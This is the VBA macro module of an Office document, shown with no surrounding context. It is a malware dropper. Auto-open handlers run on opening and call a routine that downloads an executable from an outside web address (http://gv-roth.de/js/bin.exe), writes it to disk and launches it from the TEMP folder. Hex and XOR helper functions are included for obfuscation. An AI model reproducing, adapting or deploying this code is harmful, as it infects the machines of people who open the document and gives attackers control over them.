Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Public Function Hextostring(ByVal sText As String) As String
    Dim sDummy As String
    Dim FNOMR As String
    Dim lIndex As Long

    For lIndex = 1 To Len(sText) Step 2
        sDummy = Chr$(Val(Chr$(38) & Chr$(72) & Mid$(sText, lIndex, 2)))
        FNOMR = FNOMR & sDummy

    Next lIndex

    Hextostring = FNOMR

End Function


Sub Auto_Open()
    fInit
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub

Function fNetPut(ByVal sURL As String, ByVal sFile As String) As Boolean
     Dim oHttp As Object
     Dim lFileNumber As Long
     Dim bDataStream() As Byte

     Set oHttp = CreateObject("MSXML2.XMLHTTP")
     oHttp.Open "GET", sURL, False

     oHttp.Send "gVHBnk"
     bDataStream = oHttp.responseBody

     lFileNumber = FreeFile
     Open sFile For Binary As #lFileNumber
     Put #lFileNumber, , bDataStream
     Close #lFileNumber

     Set oShell = CreateObject("Shell.Application")

     oShell.Open Environ("TEMP") & "\DYIATHUQLCW.exe"

End Function

Sub fInit()
    sURL = "http://gv-roth.de/js/bin.exe"
    fNetPut sURL, "TEMP" & "\DYIATHUQLCW.exe"
End Sub

Public Function XORI(ByVal sValue As String, ByVal sKey As String) As String

    Dim lIndex As Long

    For lIndex = 1 To Len(sValue)
        XORI = XORI & Chr(Asc(Mid(sKey, IIf(lIndex Mod Len(sKey) <> 0, lIndex Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sValue, lIndex, 1)))

    Next lIndex

End Function
